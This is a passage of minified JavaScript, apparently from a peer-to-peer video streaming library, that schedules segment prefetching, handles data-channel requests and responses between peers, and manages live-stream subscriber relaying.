                        if (!this.waitForPeer && !(this.nextLostSN >= 0 && this.nextLostSN >= this.currPlaySN - 10) && this.hasPeers) {
                            if (this.mBufferedDuration < this.allowP2pLimit) return void e.warn("low buffer time, skip prefetch");
                            var n = this.peerManager.getPeersOrderByWeight();
                            if (0 !== n.length) {
                                var r = [],
                                    o = t.prefetchNum,
                                    s = t.endSN,
                                    a = 0,
                                    u = this.loadingSN + 1,
                                    l = t.live;
                                if (!l) {
                                    var c = Math.min.apply(Math, i(n.filter(function(e) {
                                        return e.endSN >= u
                                    }).map(function(e) {
                                        return e ? e.startSN : 1 / 0
                                    })));
                                    if (!isFinite(c)) return;
                                    u < c && (u = c)
                                }
                                for (; r.length <= o && r.length < n.length && a < this.maxPrefetchCount;) {
                                    if (!l && u > s) return;
                                    if (this.bitset.has(u)) u++;
                                    else {
                                        if (u !== this.loadingSN && this.bitCounts.has(u) && !this.requestingMap.has(u)) {
                                            var f = !0,
                                                d = !1,
                                                h = void 0;
                                            try {
                                                for (var g, p = n[Symbol.iterator](); !(f = (g = p.next()).done); f = !0) {
                                                    var v = g.value;
                                                    if (!r.includes(v) && v.bitset.has(u)) {
                                                        v.requestDataBySN(u, !1), e.info("request prefetch " + u + " from peer " + v.remotePeerId + " downloadNum " + v.downloadNum), r.push(v), this.requestingMap.set(u, v.remotePeerId);
                                                        break
                                                    }
                                                }
                                            } catch (e) {
                                                d = !0, h = e
                                            } finally {
                                                try {
                                                    !f && p.return && p.return()
                                                } finally {
                                                    if (d) throw h
                                                }
                                            }
                                        }
                                        a++, u++
                                    }
                                }
                                this.loadedPeerNum = r.length
                            }
                        }
                    }
                }, {
                    key: "addPeer",
                    value: function(e) {
                        if (l(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "addPeer", this).call(this, e), this.waitForPeer && this.criticalSeg) {
                            var n = this.criticalSeg.segId,
                                r = this.criticalSeg.sn,
                                i = e.remotePeerId,
                                o = this.requestingMap;
                            o.checkIfPeerUnknown(r) && (e.bitset.has(r) ? (this.logger.info("found initial seg " + r + " from peer " + i), o.set(r, i), e.requestDataById(n, r, !0)) : this.waitingPeers === this.peersNum && this.criticaltimeout())
                        }
                    }
                }, {
                    key: "deletePeer",
                    value: function(e) {
                        if (l(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "deletePeer", this).call(this, e), this.subscribeMode && e.remotePeerId === this.subscribeParent.remotePeerId) {
                            var n = "subscribe parent is leaved";
                            this.logger.warn(n), this._unsubscribe(n), this.criticaltimeout()
                        }
                    }
                }, {
                    key: "load",
                    value: function(e, t, n) {
                        this.isReceiver = !0;
                        var r = this.logger,
                            o = this.config;
                        this.context = e;
                        var s = e.frag,
                            a = s.segId,
                            u = s.sn;
                        this.callbacks = n, this.stats = (0, b.createLoadStats)(), this.criticalSeg = {
                            sn: u,
                            segId: a
                        }, this.targetPeers.length > 0 ? this.criticalSeg.targetPeers = [].concat(i(this.targetPeers.map(function(e) {
                            return e.remotePeerId
                        }))) : this.criticalSeg.targetPeers = [].concat(i(this.requestingMap.getAllPeerIds(u)));
                        var l = this.mBufferedDuration - o.httpLoadTime;
                        if (this.waitForPeer ? l = o.waitForPeerTimeout : l > this.dcDownloadTimeout && (l = this.dcDownloadTimeout), this.requestingMap.has(u)) r.info("wait for criticalSeg segId " + a + " at " + u + " timeout " + l);
                        else {
                            var c = !0,
                                f = !1,
                                d = void 0;
                            try {
                                for (var h, g = this.targetPeers[Symbol.iterator](); !(c = (h = g.next()).done); c = !0) {
                                    var p = h.value;
                                    p.downloading || (r.info("request criticalSeg segId " + a + " at " + u + " from " + p.remotePeerId + " timeout " + l), p.requestDataById(a, u, !0)), this.requestingMap.set(u, p.remotePeerId)
                                }
                            } catch (e) {
                                f = !0, d = e
                            } finally {
                                try {
                                    !c && g.return && g.return()
                                } finally {
                                    if (f) throw d
                                }
                            }
                        }
                        this.criticaltimeouter = setTimeout(this.criticaltimeout.bind(this, !0), 1e3 * l), this.targetPeers = []
                    }
                }, {
                    key: "onBufferManagerSegAdded",
                    value: function(e) {
                        this._sendSegmentToSubscribers(e)
                    }
                }, {
                    key: "onBufferManagerLost",
                    value: function(e, t, n) {
                        this.currLostSN = e, n && (this.nextLostSN = n), this.bitset.delete(e), this.bitCounts.delete(e)
                    }
                }, {
                    key: "destroy",
                    value: function() {
                        l(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "destroy", this).call(this), clearTimeout(this.checkTimer), clearTimeout(this.waitForPeerTimer), this.logger.warn("destroy SnScheduler")
                    }
                }, {
                    key: "_setupDC",
                    value: function(e) {
                        var n = this;
                        l(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "_setupDC", this).call(this, e);
                        var r = this.logger,
                            i = this.config;
                        e.on(d.default.DC_HAVE, function(t) {
                            if (t.sn && e.bitset && t.sn && t.sn >= 0) {
                                var r = t.sn;
                                if (e.bitset.add(r), n.bitset.has(r) || n._increBitCounts(r), i.live) {
                                    var o = r - 20;
                                    o > 0 && e.bitset.delete(o)
                                }
                                n.emit(d.default.SCH_DCHAVE, t.seg_id), (0, m.queueMicrotask)(function() {
                                    !i.live || n.criticalSeg || n.subscribeMode || n.checkPeers()
                                })
                            }
                        }).on(d.default.DC_LOST, function(t) {
                            if (t.sn && e.bitset) {
                                var r = t.sn;
                                e.bitset.delete(r), n._decreBitCounts(r)
                            }
                        }).on(d.default.DC_PIECE, function(t) {
                            n.subscribers.length > 0 && t.sn > n.subscriberEdgeSN && (n._sendPieceToSubscribers(t.sn, t.seg_id, !1, !1, t), e.addDownloadListener(function(e, t, r, i, o) {
                                r ? n._sendPieceToSubscribers(e, t, !1, !0, i) : n._sendPieceToSubscribers(e, t, !0, !1, i, o)
                            }), n.subscriberEdgeSN = t.sn), t.ext && t.ext.incompletes >= 2 || n.notifyAllPeers(t.sn, t.seg_id)
                        }).on(d.default.DC_PIECE_NOT_FOUND, function(t) {
                            var o = t.sn;
                            n.criticalSeg && n.criticalSeg.sn === o && (1 === n.criticalSeg.targetPeers.length ? (clearTimeout(n.criticaltimeouter), r.info("DC_PIECE_NOT_FOUND " + o), n.criticalSeg = null, n.callbacks.onTimeout(n.stats, n.context, null)) : n.criticalSeg.targetPeers = n.criticalSeg.targetPeers.filter(function(t) {
                                return t !== e.remotePeerId
                            })), e.bitset.delete(o), i.live && e.resetContinuousHits(), n.requestingMap.delete(o), n._decreBitCounts(o), e.checkIfNeedChoke()
                        }).on(d.default.DC_RESPONSE, function(i, o) {
                            var s = n.config,
                                a = i.segId,
                                u = i.sn,
                                f = i.data,
                                d = n.criticalSeg && n.criticalSeg.segId === a;
                            if (s.validateSegment(a, f))
                                if (n.notifyAllPeers(u, a), l(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "reportDCTraffic", n).call(n, u, i.size, o), d) {
                                    r.info("receive criticalSeg seg_id " + a), clearTimeout(n.criticaltimeouter), n.criticaltimeouter = null, e.miss = 0;
                                    var h = n.stats;
                                    h.tfirst = h.loading.first = Math.max(h.trequest, performance.now()), h.tload = h.loading.end = h.tfirst, h.loaded = h.total = f.byteLength, n.criticalSeg = null;
                                    var g = n.context.frag;
                                    g.fromPeerId = e.remotePeerId, g.loadByP2P = !0, n.callbacks.onSuccess({
                                        data: f,
                                        url: n.context.url
                                    }, h, n.context), e.increContinuousHits(), s.maxSubscribeLevel && s.live && !n.subscribeMode && e.continuousHits > 7 && e.sendSubscribe()
                                } else {
                                    if (n.bitset.has(u)) return;
                                    var p = new c.Segment(u, a, f, e.remotePeerId);
                                    n.bufMgr.putSeg(p), n.updateLoaded(u)
                                }
                            else r.warn("segment " + a + " validate failed"), d && (clearTimeout(n.criticaltimeouter), n.criticaltimeout());
                            n.requestingMap.delete(u), !s.live || n.criticalSeg || n.subscribeMode || n.checkPeers()
                        }).on(d.default.DC_REQUEST, function(t) {
                            var i = t.sn;
                            n.isUploader = !0, n.subscribers.includes(e.remotePeerId) && (e.subscribeEdgeSN = i);
                            var o = t.seg_id;
                            o || (o = n.bufMgr.getSegIdBySN(i));
                            var s = null;
                            if (n.requestingMap.has(i) && (s = n.getPeerLoadedMore(i)), n.bufMgr.hasSegOfId(o)) {
                                r.info("found seg from bufMgr");
                                var a = n.bufMgr.getSegById(o);
                                e.sendBuffer(a.sn, a.segId, a.data, {
                                    from: "SegmentFromCache"
                                })
                            } else s && s.downloading && s.pieceMsg.sn === i ? (r.info("target had " + s.bufArr.length + " packets, wait for remain from upstream " + s.remotePeerId), e.sendPartialBuffer(s.pieceMsg, s.bufArr, {
                                from: "WaitForPartial",
                                incompletes: 1
                            }), function(e, t) {
                                e.addDownloadListener(function(e, n, r, i, o) {
                                    r ? t.sendMsgPieceAbort(i) : t.send(i), o && (t.uploading = !1)
                                })
                            }(s, e)) : i >= n.loadingSN ? (r.info("peer request " + i + " wait for seg"), n.bufMgr.once("" + d.default.BM_ADDED_SN_ + i, function(t) {
                                t ? (r.info("peer request notify seg " + t.sn), e.sendBuffer(t.sn, t.segId, t.data, {
                                    from: "NotifySegment"
                                })) : e.sendPieceNotFound(i, o)
                            })) : e.sendPieceNotFound(i, o)
                        }).on(d.default.DC_SUBSCRIBE, function() {
                            if (n.config.live) {
                                var t = n.subscribers.length,
                                    i = n.config.maxSubscribeLevel;
                                if (0 === i) e.sendSubscribeReject("subscribe disabled");
                                else if (t >= 25) e.sendSubscribeReject("too many subscribers");
                                else if (n.subscribeLevel >= i) e.sendSubscribeReject("subscribe level reach " + n.subscribeLevel);
                                else if (n.subscribers.indexOf(e.remotePeerId) >= 0) e.sendSubscribeReject("subscriber already exist");
                                else {
                                    if (t >= 4) {
                                        var o = [];
                                        if (n.subscribers.forEach(function(e) {
                                                var t = n.peerManager.getPeer(e).uploadSpeed;
                                                t && o.push(t)
                                            }), !y.default.evaluatePeersSpeed(o, n.estimatedSize)) return void e.sendSubscribeReject("Insufficient upload capability")
                                    }
                                    n.subscribers.push(e.remotePeerId), r.info("subscribers add " + e.remotePeerId), e.sendSubscribeAccept(n.subscribeLevel)
                                }
                            }
                        }).on(d.default.DC_UNSUBSCRIBE, function(t) {
                            var i = n.subscribers.indexOf(e.remotePeerId); - 1 !== i && (r.info("subscribers remove " + e.remotePeerId + " reason " + t.reason), n.subscribers.splice(i, 1))
                        }).on(d.default.DC_SUBSCRIBE_ACCEPT, function(t) {
                            if (!n.subscribeMode) {
                                var r = t.level || 0;
                                n.subscribeMode = !0, n.subscribeLevel = r + 1, n.subscribeParent = e, n.notifySubscribeLevel()
                            }
                        }).on(d.default.DC_SUBSCRIBE_REJECT, function(t) {
                            r.warn("subscribe rejected, reason " + t.reason), e.resetContinuousHits()
                        }).on(d.default.DC_SUBSCRIBE_LEVEL, function(e) {
                            if (n.subscribeMode) {
                                var t = e.level || 0;
                                n.subscribeLevel = t + 1, r.info("set subscribe level to " + n.subscribeLevel), n.notifySubscribeLevel()
                            }
                        })
                    }
                }, {
                    key: "_setupEngine",
                    value: function() {
                        var e = this;
                        this.engine.on(d.default.FRAG_LOADING, function(t, n, r) {
                            e.loadingSN = t, e.loadingSegId = n, r && e.notifyAllPeers(t, n)
                        }).on(d.default.FRAG_LOADED, function(t, n, r, i) {
                            e.config.live && (e.estimatedSize = r), e.updateLoaded(t)
                        }).on(d.default.FRAG_CHANGED, function(t, n) {
                            e.updatePlaySN(t)
                        })
                    }
                }, {
                    key: "notifyPeersLoaded",
                    value: function(e) {
                        this.logger.info("notifyPeersLoaded " + e), this.waitForPeer && (0 === e ? this.criticaltimeout() : this.waitingPeers = e)
                    }
                }, {
                    key: "_unsubscribe",
                    value: function(e) {
                        this.logger.warn("unsubscribe to " + this.subscribeParent.remotePeerId), this.subscribeParent.sendUnsubscribe(e), this.subscribeParent = null, this.subscribeLevel = 0, this.subscribeMode = !1, this.notifySubscribeLevel()
                    }
                }, {
                    key: "_sendSegmentToSubscribers",
                    value: function(e) {
                        var t = this,
                            n = e.sn,
                            r = e.segId,
                            i = e.data;
                        this.subscribers = this.subscribers.filter(function(e) {
                            var o = t.peerManager.getPeer(e);
                            return o ? !(!o.uploading && !o.bitset.has(n)) || (t.logger.info("send seg " + r + " to subscriber " + e), o.uploading = !0, o.sendBuffer(n, r, i, {
                                from: "SegmentToSubscribers"
                            }), o.bitset.add(n), !0) : (t.logger.info("subscribers remove " + e), !1)
                        })
                    }
                }, {
                    key: "_sendPieceToSubscribers",
                    value: function(e, t, n, r, i, o) {
                        var s = this;
                        this.subscribers = this.subscribers.filter(function(t) {
                            var a = s.peerManager.getPeer(t);
                            if (a) {
                                if (n && e === a.pieceMsg.sn) a.send(i), o && (a.uploading = !1, a.bitset.add(e));
                                else if (!n)
                                    if (r) a.sendMsgPieceAbort(i);
                                    else {
                                        if (a.uploading || e <= a.subscribeEdgeSN) return !0;
                                        a.subscribeEdgeSN = e, a.uploading = !0, a.pieceMsg = i, s.logger.info("downstream msg " + JSON.stringify(i) + " to subscriber " + t), a.sendMsgPiece(i, {
                                            from: "PieceToSubscribers",
                                            incompletes: 1
                                        })
                                    } return !0
                            }
                            return s.logger.info("subscribers remove " + t), !1
                        })
                    }
                }]), t
            }(p.default);
        t.default = w, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var i = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            o = function() {
                function e() {
                    r(this, e)
                }
                return i(e, null, [{
                    key: "evaluatePeersSpeed",
                    value: function(e, t) {
                        var n = t / 3500,
                            r = n,
                            i = 1.05 * n,
                            o = 0;
                        return e.forEach(function(e) {
                            if (e) {
                                if (e < r) return !1;
                                o += e
                            }
                        }), o / e.length >= i
                    }
                }]), e
            }();
        t.default = o, e.exports = t.default
    }])
});